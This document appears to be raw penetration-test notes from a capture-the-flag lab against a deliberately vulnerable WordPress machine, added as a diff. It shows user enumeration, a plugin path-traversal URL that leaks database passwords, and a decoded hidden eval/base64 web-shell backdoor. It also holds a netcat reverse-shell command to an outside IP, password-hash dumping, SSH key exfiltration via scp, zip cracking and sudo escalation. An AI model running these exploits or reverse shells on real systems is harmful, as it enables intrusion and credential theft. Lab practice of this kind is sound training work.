@@ -1,0 +1,207 @@
+[09:25:46] 403 -  273B  - /.php
+[09:27:22] 301 -    0B  - /index.php/login/  ->  http://www.smol.thm/index.php/login/
+[09:27:30] 200 -    7KB - /license.txt
+[09:28:06] 200 -    3KB - /readme.html
+[09:28:13] 403 -  273B  - /server-status
+[09:28:13] 403 -  273B  - /server-status/
+[09:28:46] 200 -    0B  - /wp-config.php
+[09:28:46] 301 -  307B  - /wp-admin  ->  http://smol.thm/wp-admin/
+[09:28:46] 302 -    0B  - /wp-admin/  ->  http://www.smol.thm/wp-login.php?redirect_to=http%3A%2F%2Fsmol.thm%2Fwp-admin%2F&reauth=1
+[09:28:46] 409 -    3KB - /wp-admin/setup-config.php
+[09:28:46] 200 -  500B  - /wp-admin/install.php
+[09:28:46] 400 -    1B  - /wp-admin/admin-ajax.php0
+[09:28:47] 200 -    0B  - /wp-content/
+[09:28:47] 301 -  309B  - /wp-content  ->  http://smol.thm/wp-content/
+[09:28:47] 200 -   84B  - /wp-content/plugins/akismet/akismet.php
+[09:28:47] 500 -    0B  - /wp-content/plugins/hello.php
+[09:28:47] 200 -  410B  - /wp-content/upgrade/
+[09:28:47] 200 -  528B  - /wp-content/uploads/
+[09:28:48] 200 -    0B  - /wp-includes/rss-functions.php
+[09:28:48] 200 -    0B  - /wp-cron.php
+[09:28:48] 301 -  310B  - /wp-includes  ->  http://smol.thm/wp-includes/
+[09:28:48] 200 -    2KB - /wp-login.php
+[09:28:48] 200 -    4KB - /wp-includes/
+[09:28:48] 302 -    0B  - /wp-signup.php  ->  http://www.smol.thm/wp-login.php?action=register
+[09:28:49] 405 -   42B  - /xmlrpc.php
+
+
+
++] admin
+ | Found By: Wp Json Api (Aggressive Detection)
+ |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] think
+ | Found By: Wp Json Api (Aggressive Detection)
+ |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] wp
+ | Found By: Wp Json Api (Aggressive Detection)
+ |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ | Confirmed By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+
+[+] gege
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] diego
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] xavi
+
+
+
+wpscan --url http://www.smol.thm -e ap,at,cb,dbe,u,m  
+
+[i] Plugin(s) Identified:
+
+[+] jsmol2wp
+ | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
+ | Latest Version: 1.07 (up to date)
+ | Last Updated: 2018-03-09T10:28:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 1.07 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
+
+
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
+
+/** Database username */
+define( 'DB_USER', 'wpuser' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
+
+1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.
+
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
+
+function hello_dolly() {
+	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
+
+└─$ echo "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | base64 -d
+
+ if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }  //php decode
+
+<?  if (isset($_GET["cmd"])) { system($_GET["cmd"]) ?>   //where to set cmd parameter??
+
+http://www.smol.thm/wp-admin/index.php?cmd=whoami //get the feedback, so try diif places of cmd parameter
+
+http://www.smol.thm/wp-admin/index.php?cmd=busybox%20nc%2010.14.105.91%208821%20-e%20bash
+
+
+
+mysql> select * from wp_users;
+select * from wp_users;
++----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
+| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
++----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
+|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
+|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
+|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
+|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gegcle          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
+|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
+|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi    
+
+
+sandiegocalifornia for diego
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+diego@ip-10-10-85-105:/home/think/.ssh$ ls
+ls
+authorized_keys  id_rsa  id_rsa.pub
+diego@ip-10-10-85-105:/home/think/.ssh$ scp id_rsa ed@10.14.105.91:/tmp
+
+think@ip-10-10-85-105:/home/gege$ cd /etc/pam.d
+think@ip-10-10-85-105:/etc/pam.d$ ls -la
+total 104
+drwxr-xr-x   2 root root 4096 Jul 20 11:22 .
+drwxr-xr-x 105 root root 4096 Jul 30 13:31 ..
+-rw-r--r--   1 root root  250 Jan 12  2024 atd
+-rw-r--r--   1 root root  384 Jan 12  2024 chfn
+-rw-r--r--   1 root root   92 Jan 12  2024 chpasswd
+-rw-r--r--   1 root root  581 Jan 12  2024 chsh
+-rw-r--r--   1 root root 1208 Jul 20 11:22 common-account
+-rw-r--r--   1 root root 1242 Jul 20 11:22 common-auth
+-rw-r--r--   1 root root 1440 Jul 20 11:22 common-password
+-rw-r--r--   1 root root 1470 Jul 20 11:22 common-session
+-rw-r--r--   1 root root 1435 Jul 20 11:22 common-session-noninteractive
+-rw-r--r--   1 root root  606 Jan 12  2024 cron
+-rw-r--r--   1 root root 4126 Jan 12  2024 login
+-rw-r--r--   1 root root   92 Jan 12  2024 newusers
+-rw-r--r--   1 root root  520 Jan 12  2024 other
+-rw-r--r--   1 root root   92 Jan 12  2024 passwd
+-rw-r--r--   1 root root  270 Jan 12  2024 polkit-1
+-rw-r--r--   1 root root  143 Jan 12  2024 runuser
+-rw-r--r--   1 root root  138 Jan 12  2024 runuser-l
+-rw-r--r--   1 root root 2133 Jan 12  2024 sshd
+-rw-r--r--   1 root root 2391 Jan 12  2024 su
+-rw-r--r--   1 root root  137 Jan 12  2024 su-l
+-rw-r--r--   1 root root  239 Jan 12  2024 sudo
+-rw-r--r--   1 root root  317 Jan 12  2024 systemd-user
+-rw-r--r--   1 root root  119 Jan 12  2024 vmtoolsd
+think@ip-10-10-85-105:/etc/pam.d$ cat su
+
+
+think@ip-10-10-85-105:/etc/pam.d$ cat su
+#
+# The PAM configuration file for the Shadow `su' service
+#
+
+# This allows root to su without passwords (normal operation)
+auth       sufficient pam_rootok.so
+auth  [success=ignore default=1] pam_succeed_if.so user = gege
+auth  sufficient                 pam_succeed_if.so use_uid user = think
+# Uncomment this to force users to be a member of group root
+
+gege@ip-10-10-85-105:~$ ls
+wordpress.old  wordpress.old.zip
+
+scp wordpress.old.zip ed@10.14.105.91:/tmp
+
+└─$ zip2john wordpress.old.zip > ziphash
+└─$ john ziphash --force -w=/home/ed/oscp/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hero_gege@hotmail.com (wordpress.old.zip)  
+
+
+ less wp-config.php 
+/** Database username */
+define( 'DB_USER', 'xavi' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
+gege@ip-10-10-85-105:~/wordpress.old$ su xavi
+Password: 
+xavi@ip-10-10-85-105:/home/gege/wordpress.old$ cd ~
+xavi@ip-10-10-85-105:~$ 
+
+xavi@ip-10-10-85-105:/home$ sudo -l
+[sudo] password for xavi: 
+Sorry, try again.
+[sudo] password for xavi: 
+Matching Defaults entries for xavi on ip-10-10-85-105:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User xavi may run the following commands on ip-10-10-85-105:
+    (ALL : ALL) ALL
+
+xavi@ip-10-10-85-105:/home$ sudo su
+root@ip-10-10-85-105:/home$ cd /root
